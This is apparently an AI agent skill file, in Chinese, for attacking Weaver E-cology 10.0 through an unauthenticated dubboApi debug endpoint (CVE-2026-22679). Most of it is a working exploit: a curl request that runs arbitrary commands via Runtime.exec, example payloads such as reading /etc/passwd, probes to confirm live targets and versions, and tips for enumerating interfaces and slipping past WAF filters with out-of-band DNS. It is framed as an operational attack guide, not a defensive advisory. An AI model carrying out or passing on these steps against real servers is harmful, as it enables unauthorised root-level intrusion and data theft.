---
name: weaver-ecology-dubbo-rce
description: "Use when 打泛微 E-cology：dubboApi debug 未授权 RCE。"
---

# 泛微 E-cology dubboApi debug 端点未授权 RCE（CVE-2026-22679）

**CVSS 9.3**，无认证无交互。**Shadowserver 自 2026-03-31 观测到在野利用**——不是纸面洞。

影响：**E-cology 10.0，build < 20260312**。

## 一发入魂

```bash
curl -s -X POST 'http://<target>/papi/esearch/data/devops/dubboApi/debug/method' \
  -H 'Content-Type: application/json' \
  -d '{"interfaceName":"com.weaver.rpc.InvokeCommand","methodName":"executeCommand","parameters":["id"]}'
```

回显形如：`uid=0(root) gid=0(root) groups=0(root)`——泛微常以 root 跑。

参数表：

| 参数 | 含义 | 值 |
|---|---|---|
| `interfaceName` | 目标 Dubbo 接口类名 | `com.weaver.rpc.InvokeCommand` |
| `methodName` | 要调的方法 | `executeCommand` |
| `parameters` | 直接丢给 `Runtime.exec()` 的参数数组 | `["id"]` / `["cat /etc/passwd"]` |

## 为什么能打

dubboApi 的 debug 调试面被留在了生产包里。路由分发器上：

```
/login/Login.jsp                 → 要认证
/wui/index.html                  → 要认证
/papi/esearch/data/devops/dubboApi/debug/method → 一路无检查
```

端点把 3 个参数原样交给 Dubbo RPC 层，**无鉴权、无方法白名单、无参数类型校验**。攻击者自己选接口和方法名，而 `com.weaver.rpc.InvokeCommand.executeCommand` 内部就是 `Runtime.exec()`。

## 判活

```bash
# 1) 端点是否存在（不存在的路径通常 404 或跳登录页）
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
  -X POST 'http://<t>/papi/esearch/data/devops/dubboApi/debug/method' \
  -H 'Content-Type: application/json' -d '{}'
# 200/500 且返回 JSON 错误体 = 端点活
# 2) 版本
curl -s 'http://<t>/wui/index.html' | grep -o 'build[^,]*' | head -1
curl -s 'http://<t>/papi/esearch/data/devops/dubboApi/info' | head -c 500
```

## 坑

- `interfaceName` 在部分 build 里不是 `com.weaver.rpc.InvokeCommand`。找不到就枚举：先发 `{}` 看错误体里是否回显可选接口，或试 `com.weaver.rpc.InvokeCommandImpl`。
- `parameters` 是**数组**，不是单个字符串。第一个元素常见是 `id` 这种占位符，实际命令在后面的元素里——PoC 里两种都出现过，按错误回显调。
- 命令回显在 JSON body 里。若被 WAF 拦 `id`，用 `whoami` / `echo <marker>` / 带外 DNS 代替。
- E-cology 9.x 也有 `/papi/` 前缀，但 debug 面不同；按 build 号判断，别按版本号猜。
